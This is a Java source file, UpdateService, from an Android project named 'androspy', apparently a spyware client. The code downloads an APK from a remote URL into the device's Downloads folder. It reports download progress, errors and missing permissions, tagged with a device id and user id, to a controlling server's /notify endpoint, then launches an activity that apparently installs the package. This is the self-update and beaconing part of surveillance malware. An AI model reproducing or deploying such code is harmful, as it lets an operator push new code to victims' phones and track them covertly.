package buddy.ap.com.androspy;

import android.Manifest;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.os.Environment;
import android.support.v4.content.ContextCompat;
import android.util.Log;

import java.io.BufferedInputStream;
import java.io.File;
import java.io.FileOutputStream;
import java.io.InputStream;
import java.net.MalformedURLException;
import java.net.URL;
import java.net.URLConnection;
import java.util.HashMap;

import http.Http;

import static android.content.Intent.FLAG_ACTIVITY_NEW_TASK;

public class UpdateService extends BaseService {
    private static final String TAG = "UpdateService";
    public static final String PKG_FILE = "update.apk";
    private CommonParams commonParams;
    private URL url;

    public UpdateService(String url) {
        try {
            this.url = new URL(url);
        } catch (MalformedURLException e) {
            e.printStackTrace();
        }
    }

    public void setContext(Client c) {
        super.setContext(c);
        context = c;
        this.commonParams = new CommonParams(c);
    }

    @Override
    public void run() {

        if (ContextCompat.checkSelfPermission(context, Manifest.permission.WRITE_EXTERNAL_STORAGE) == PackageManager.PERMISSION_GRANTED) {

            try {
                URLConnection c = url.openConnection();
                c.connect();

                File file = Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS);
                file.mkdirs();
                File outputFile = new File(file, PKG_FILE);
                if (outputFile.exists()) {
                    outputFile.delete();
                }
                FileOutputStream fos = new FileOutputStream(outputFile);

                InputStream is = new BufferedInputStream(url.openStream());



                HashMap dlStarted = new HashMap();
                dlStarted.put("event", "download:started");
                dlStarted.put("uid", commonParams.getUid());
                dlStarted.put("device", commonParams.getDevice());
                Http doneSMS = new Http();
                doneSMS.setUrl(commonParams.getServer() + "/notify");
                doneSMS.setMethod("POST");
                doneSMS.setParams(dlStarted);
                doneSMS.execute();



                byte[] buffer = new byte[1024];
                int len1 = 0;
                while ((len1 = is.read(buffer)) != -1) {
                    fos.write(buffer, 0, len1);
                    Log.i(TAG, "Downloading...");
                }
                fos.flush();
                fos.close();
                is.close();

                Log.i(TAG, "Download Complete!!!!!");

                HashMap dlComplete = new HashMap();
                dlComplete.put("event", "download:completed");
                dlComplete.put("uid", commonParams.getUid());
                dlComplete.put("device", commonParams.getDevice());
                Http DlDone = new Http();
                DlDone.setUrl(commonParams.getServer() + "/notify");
                DlDone.setMethod("POST");
                DlDone.setParams(dlComplete);
                DlDone.execute();

                Intent updateIntent = new Intent(context, UpdateActivity.class);
                updateIntent.addFlags(FLAG_ACTIVITY_NEW_TASK);
                context.startActivity(updateIntent);


            } catch (Exception e) {
                Log.e("UpdateAPP", "Update error! " + e.getMessage());
                HashMap noPermit = new HashMap();
                noPermit.put("event", "download:error");
                noPermit.put("uid", commonParams.getUid());
                noPermit.put("device", commonParams.getDevice());
                noPermit.put("error", "Download failed");
                Http doneSMS = new Http();
                doneSMS.setUrl(commonParams.getServer() + "/notify");
                doneSMS.setMethod("POST");
                doneSMS.setParams(noPermit);
                doneSMS.execute();

            }
        } else {
            Log.e(TAG, "No WRITE_EXTERNAL_STORAGE permission!!!");
            HashMap noPermit = new HashMap();
            noPermit.put("event", "nopermission");
            noPermit.put("uid", commonParams.getUid());
            noPermit.put("device", commonParams.getDevice());
            noPermit.put("permission", "WRITE_EXTERNAL_STORAGE");
            Http doneSMS = new Http();
            doneSMS.setUrl(commonParams.getServer() + "/notify");
            doneSMS.setMethod("POST");
            doneSMS.setParams(noPermit);
            doneSMS.execute();

            requestPermissions();
        }
    }
}